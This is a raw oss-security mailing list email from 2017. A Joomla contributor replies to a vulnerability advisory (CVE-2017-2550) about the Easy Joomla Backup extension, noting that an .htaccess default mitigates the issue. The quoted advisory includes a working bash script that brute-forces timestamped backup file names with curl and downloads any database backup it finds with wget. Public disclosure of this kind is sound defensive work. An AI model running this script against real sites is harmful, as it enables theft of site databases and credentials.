X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["8555" "Thursday" "28" "September" "2017" "15:09:11" "+0200" "David Jardin" "david.jardin@community.joomla.org" "<etPan.59ccf477.771c0a21.6fc3@community.joomla.org>" "194" "Re: [oss-security] Joomla extension Easy Joomla Backup v3.2.4 database backup exposure" nil nil nil "9" "2017092813:09:11" "[oss-security] Joomla extension Easy Joomla Backup v3.2.4 database backup exposure" (number mark "U       david.jardin Sep 28  194/8555  " thread-indent "\"Re: [oss-security] Joomla extension Easy Joomla Backup v3.2.4 database backup exposure\"\n") "<E969A16B-9B90-4F8A-8ECA-29565C90184C@me.com>" ("<E969A16B-9B90-4F8A-8ECA-29565C90184C@me.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 9950 invoked by uid 550); 28 Sep 2017 13:21:36 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 32057 invoked from network); 28 Sep 2017 13:09:24 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=community-joomla-org.20150623.gappssmtp.com; s=20150623;
        h=date:from:to:message-id:in-reply-to:references:subject:mime-version;
        bh=vfErF9tSiW1qSuAENzn0oPBLOUfXg86rWJD2+/KZYuY=;
        b=OhVp+m+uWDJocNi0AMGZt3pYLYG9JtB0at6SxSfH5tpuM+4VHcLkiurlPMNdKadmPt
         Rvz+eM+uWZQMPcmJKI0cl9WzV4EnrQK2kQGAVEkBVgEUWYPGX9DBNZgBkUk+EO2L4Nvk
         o8+DCrZensDCD4OEvATMaLcA5NYRCzAb9SV5isy2xjqO9VR2zLnemiEowNRgGGvZgcyR
         DhQvNV4cGyB1RR63PV/Bmgeqbmo4q/GQ6p4npCtACIjERfmSVv/i+OZbv+SmRMzxH6iB
         y1I2fMChIMjhO8BWpuerepnqJCY2bvpZuCeXnjt3KQuTEUUPVKJcDulGRtuuoFfPenj2
         c9DQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:date:from:to:message-id:in-reply-to:references
         :subject:mime-version;
        bh=vfErF9tSiW1qSuAENzn0oPBLOUfXg86rWJD2+/KZYuY=;
        b=ZedZD1zqbnjfDaBleQMva8TZb39BqQiy5kdNBB+w3TrZYOVviTsBML51d0nVHLHSZW
         E96I1ApM3duNBWaqE7iROuP7ji2Do4VV6ejL8XslV82QBZO4bO3oH6zANBeTl2oQBerL
         RlrG3n2ipizZwqxSLccxaxY1pmmHCg75SDaV2rr1Te/0/eLtJGRmejEO8/0qEbbSf3xe
         0k/qTDpuNiPlrNyfMs4lqpvyUBDCwV6scKa6Vw9hY3pW54CZInHDiaLQ3GUN84ml+G4Z
         wgD/24TJ5I07WVaho1ShUMHtTVMiwS0+JozyWh0eDBH9IMig96XhuOJQoBgaqWMAiizx
         f1rQ==
X-Gm-Message-State: AHPjjUhBQbJn9gJjWW3WIc0PC/0UTsSa8o0xsZBeIlZpoYJlxl83EBI3
	jZrV2cAA4jfChzHGHe4qilIHIZuAsKg=
X-Google-Smtp-Source: AOwi7QBQD1YS+2lDCZo10fb9P0aEO1r+pr83EGIX+ierEaYOkuTkDATX4247TvpdJ3uOVgvd/RCS1w==
X-Received: by 10.80.149.75 with SMTP id v11mr5756144eda.284.1506604152718;
        Thu, 28 Sep 2017 06:09:12 -0700 (PDT)
Date: Thu, 28 Sep 2017 15:09:11 +0200
From: David Jardin <david.jardin@community.joomla.org>
To: oss-security@lists.openwall.com
Message-ID: <etPan.59ccf477.771c0a21.6fc3@community.joomla.org>
In-Reply-To: <E969A16B-9B90-4F8A-8ECA-29565C90184C@me.com>
References: <E969A16B-9B90-4F8A-8ECA-29565C90184C@me.com>
X-Mailer: Airmail (442)
MIME-Version: 1.0
Content-Type: multipart/signed;
 boundary="72F30701-8B48-4DA8-8AAF-0717D0E06C3B";
 protocol="application/pgp-signature"; micalg=pgp-sha512
Subject: Re: [oss-security] Joomla extension Easy Joomla Backup v3.2.4
 database backup exposure

--72F30701-8B48-4DA8-8AAF-0717D0E06C3B
Content-Type: multipart/alternative; boundary="59ccf477_236c2e64_6fc3"

--59ccf477_236c2e64_6fc3
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: quoted-printable
Content-Disposition: inline

It=E2=80=99s worth to mention that the extension has a default .htaccess fi=
le with a =E2=80=9Edeny from all=E2=80=9C in the backup directory, that wil=
l mitigate the described attack on pretty much any standard shared-hosting =
platform that I=E2=80=99m aware of.




Am 28. September 2017 um 14:37:20, Larry W. Cashdollar (larry0@me.com) schr=
ieb:

Title: Joomla extension Easy Joomla Backup v3.2.4 database backup exposure=
=20=20
Author: Larry W. Cashdollar, @_larry0=20=20
Date: 2017-09-07=20=20
CVE-ID:[CVE-2017-2550]=20=20
Download Site: https://joomla-extensions.kubik-rubik.de/ejb-easy-joomla-bac=
kup=20=20
Vendor: kubik-rubik=20=20
Vendor Notified: 2017-09-07=20=20
Vendor Contact:=20=20
Advisory: http://www.vapidlabs.com/advisory.php?v=3D200=20=20
Description: Easy Joomla Backup creates 'old-school' backups without any fr=
ills.=20=20
Vulnerability:=20=20
The software creates a copy of the backup in the web root. The file name is=
 easily guessable as it's just a time stamp:=20=20

http://example.com/administrator/components/com_easyjoomlabackup/backups/DO=
MAIN_YEAR-MONTH-DAY_H-M-S.zip=20=20

Exploit Code:=20=20
=E2=80=A2 #!/bin/bash=20=20
=E2=80=A2 #Larry W. Cashdollar, @_larry0 9/7/2017=20=20
=E2=80=A2 #Bruteforce download backups for Joomla Extension Easy Joomla Bac=
kup v3.2.4=20=20
=E2=80=A2 #https://joomla-extensions.kubik-rubik.de/ejb-easy-joomla-backup=
=20=20
=E2=80=A2 MONTH=3D09=20=20
=E2=80=A2 DAY=3D07=20=20
=E2=80=A2 YEAR=3D2017=20=20
=E2=80=A2 Z=3D0=20=20
=E2=80=A2 #May need to set the DOMAIN to $1 the target depending on how WP =
is configured.=20=20
=E2=80=A2 DOMAIN=3D192.168.0.163=20=20
=E2=80=A2=20=20
=E2=80=A2 echo "Scanning website for available backups:"=20=20
=E2=80=A2 for y in `seq -w 0 23`; do=20=20
=E2=80=A2 for x in `seq -w 0 59`; do=20=20
=E2=80=A2 Y=3D`echo "scale=3D2;($Z/86000)*100"|bc`;=20=20
=E2=80=A2 echo -ne "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\=
b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b=
\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\=
b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b$CPATH $Y%"=20=20
=E2=80=A2 for z in `seq -w 0 59`; do=20=20
=E2=80=A2 Z=3D$(( $Z + 1 ));=20=20
=E2=80=A2 CPATH=3D"http://$1/administrator/components/com_easyjoomlabackup/=
backups/"$DOMAIN"_"$YEAR"-"$MONTH"-"$DAY"_"$y"-"$x"-"$z".zip";=20=20
=E2=80=A2 RESULT=3D`curl -s --head $CPATH|grep 200`;=20=20
=E2=80=A2 if [ -n "$RESULT" ]; then=20=20
=E2=80=A2 echo ""=20=20
=E2=80=A2 echo "[+] Location $CPATH Found";=20=20
=E2=80=A2 echo "[+] Received $RESULT";=20=20
=E2=80=A2 echo "Downloading......";=20=20
=E2=80=A2 wget $CPATH=20=20
=E2=80=A2 fi;=20=20
=E2=80=A2 done=20=20
=E2=80=A2 done=20=20
=E2=80=A2 done=20=20
=E2=80=A2 echo "Completed."
--=C2=A0
Kind Regards,
David Jardin=

--59ccf477_236c2e64_6fc3
Content-Type: text/html; charset="utf-8"
Content-Transfer-Encoding: quoted-printable
Content-Disposition: inline

<html><head><style>body{font-family:Helvetica,Arial;font-size:13px}</style>=
</head><body style=3D"word-wrap: break-word; -webkit-nbsp-mode: space; -web=
kit-line-break: after-white-space;"><div id=3D"bloop_customfont" style=3D"f=
ont-family:Helvetica,Arial;font-size:13px; color: rgba(0,0,0,1.0); margin: =
0px; line-height: auto;">It=E2=80=99s worth to mention that the extension h=
as a default .htaccess file with a =E2=80=9Edeny from all=E2=80=9C in the b=
ackup directory, that will mitigate the described attack on pretty much any=
 standard shared-hosting platform that I=E2=80=99m aware of.</div><div id=
=3D"bloop_customfont" style=3D"font-family:Helvetica,Arial;font-size:13px; =
color: rgba(0,0,0,1.0); margin: 0px; line-height: auto;"><br></div><div id=
=3D"bloop_customfont" style=3D"font-family:Helvetica,Arial;font-size:13px; =
color: rgba(0,0,0,1.0); margin: 0px; line-height: auto;"><br></div><div id=
=3D"bloop_customfont" style=3D"font-family:Helvetica,Arial;font-size:13px; =
color: rgba(0,0,0,1.0); margin: 0px; line-height: auto;"><br></div> <br><p =
class=3D"airmail_on">Am 28. September 2017 um 14:37:20, Larry W. Cashdollar=
 (<a href=3D"mailto:larry0@me.com">larry0@me.com</a>) schrieb:</p> <blockqu=
ote type=3D"cite" class=3D"clean_bq"><span><div><div></div><div>Title: Joom=
la extension Easy Joomla Backup v3.2.4 database backup exposure
<br>Author: Larry W. Cashdollar, @_larry0
<br>Date: 2017-09-07
<br>CVE-ID:[CVE-2017-2550]
<br>Download Site: https://joomla-extensions.kubik-rubik.de/ejb-easy-joomla=
-backup
<br>Vendor: kubik-rubik
<br>Vendor Notified: 2017-09-07
<br>Vendor Contact:
<br>Advisory: http://www.vapidlabs.com/advisory.php?v=3D200
<br>Description: Easy Joomla Backup creates 'old-school' backups without an=
y frills.
<br>Vulnerability:
<br>The software creates a copy of the backup in the web root.  The file na=
me is easily guessable as it's just a time stamp:
<br>
<br>http://example.com/administrator/components/com_easyjoomlabackup/backup=
s/DOMAIN_YEAR-MONTH-DAY_H-M-S.zip
<br>
<br>Exploit Code:
<br>	=E2=80=A2 #!/bin/bash
<br>	=E2=80=A2 #Larry W. Cashdollar, @_larry0 9/7/2017
<br>	=E2=80=A2 #Bruteforce download backups for Joomla Extension Easy Jooml=
a Backup v3.2.4
<br>	=E2=80=A2 #https://joomla-extensions.kubik-rubik.de/ejb-easy-joomla-ba=
ckup
<br>	=E2=80=A2 MONTH=3D09
<br>	=E2=80=A2 DAY=3D07
<br>	=E2=80=A2 YEAR=3D2017
<br>	=E2=80=A2 Z=3D0
<br>	=E2=80=A2 #May need to set the DOMAIN to $1 the target depending on ho=
w WP is configured.
<br>	=E2=80=A2 DOMAIN=3D192.168.0.163
<br>	=E2=80=A2=20=20=20
<br>	=E2=80=A2 echo "Scanning website for available backups:"
<br>	=E2=80=A2 for y in `seq -w 0 23`; do
<br>	=E2=80=A2         for x in `seq -w 0 59`; do
<br>	=E2=80=A2                  Y=3D`echo "scale=3D2;($Z/86000)*100"|bc`;
<br>	=E2=80=A2                  echo -ne "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\=
b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b=
\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\=
b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b$CPATH $Y%"
<br>	=E2=80=A2         for z in `seq -w 0 59`; do
<br>	=E2=80=A2                  Z=3D$(( $Z + 1 ));
<br>	=E2=80=A2                  CPATH=3D"http://$1/administrator/components=
/com_easyjoomlabackup/backups/"$DOMAIN"_"$YEAR"-"$MONTH"-"$DAY"_"$y"-"$x"-"=
$z".zip";
<br>	=E2=80=A2                  RESULT=3D`curl -s --head $CPATH|grep 200`;
<br>	=E2=80=A2                 if [ -n "$RESULT" ]; then
<br>	=E2=80=A2                  echo ""
<br>	=E2=80=A2                  echo "[+] Location $CPATH Found";
<br>	=E2=80=A2                  echo "[+] Received $RESULT";
<br>	=E2=80=A2                  echo "Downloading......";
<br>	=E2=80=A2                  wget $CPATH
<br>	=E2=80=A2                 fi;
<br>	=E2=80=A2         done
<br>	=E2=80=A2         done
<br>	=E2=80=A2 done
<br>	=E2=80=A2 echo "Completed."</div></div></span></blockquote> <div id=3D=
"bloop_sign_1506604048197565184" class=3D"bloop_sign"><div style=3D"font-fa=
mily:helvetica,arial;font-size:13px">--&nbsp;<br><div>Kind Regards,</div><d=
iv>David Jardin</div></div></div></body></html>=

--59ccf477_236c2e64_6fc3--

--72F30701-8B48-4DA8-8AAF-0717D0E06C3B
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename=signature.asc
Content-Type: application/pgp-signature; name=signature.asc
Content-Description: Message signed with OpenPGP using AMPGpg

-----BEGIN PGP SIGNATURE-----
Comment: GPGTools - https://gpgtools.org

iQIzBAEBCgAdFiEEmakq/eQZWck3aMkXwSMTilFr/40FAlnM9HcACgkQwSMTilFr
/40HoRAAmSLQk9w9pcJCAnvXCw09mZxs4iYc1hBot5EDbDyRW+aJKTeeMoL0qKQv
K7R4EjChewWZFfvRrKqQu8C60LDxrUxblU9G+BH8fFMGZeYrQPjTjfIlTRoCkzC4
fTFatrW8pZmhJG0OrVybQZQBX+fpHG5Bo50on09CnzeQ87RtSjGD07tT0Z/9lpcz
JfcLTw8KJOO0IWy1hRczjglEj6d27aOGOg13aizS1t/xn6UDZnereeP9uG505qNM
o+YGFdTuxqy8qnRjLCneGWJ2m8D88wWCTFcGu5xr+RpV2fMQYGrr5Fimkh524dsf
1G7Vw/bgB6Nt51FrsgK8qtWLgZVeDdRHfiYNqbazZnesKVnJkL6CSs5EiYA4Jqk3
I7cI0PNohCXoAeCkn6pEu9XmWii84WIfoqdAuq7HBT6zpDQD0G4PewMjHT7/DL+Y
qO+avLtVWdvIKy6dUNCljz5guY7MmFuLl619jMKAxTIuUxx8XLrRJpp4m0YE9ymB
44bPuEXCKyVg5gVFc0Hm4r8WJRVAmrNEqwqEDrC73sFIKMKe5KbRVdhRFuoaVTgw
JtYlioH/dMHBRilnW9aE2PMCH1D1ktyolmHK3nRAHJvhoXrSrC0ws1kDHHtEmOJJ
6+OTAphEEDimDq+NEYAvqtx2L0MJByr3XBpbvWF8j0mnyDsZxF0=
=oiwt
-----END PGP SIGNATURE-----

--72F30701-8B48-4DA8-8AAF-0717D0E06C3B--
